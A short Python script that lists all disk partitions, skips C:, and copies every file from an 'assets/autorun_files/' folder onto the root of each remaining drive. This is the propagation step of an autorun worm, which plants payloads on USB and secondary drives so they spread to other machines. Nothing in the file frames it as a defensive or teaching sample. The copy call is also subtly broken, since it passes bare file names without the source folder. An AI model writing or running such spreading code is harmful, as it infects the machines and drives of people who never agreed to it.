import shutil
import psutil
import os

disk_list = []
autorun_path = ("assets/autorun_files/")

def copy_autorun_files(path):
    for autorun_files in os.listdir(autorun_path):
        shutil.copy(autorun_files,path)

for device in psutil.disk_partitions():
    disk_list.append(device.device)

disk_list.remove("C:\\")
for disk in disk_list:
    copy_autorun_files(disk)
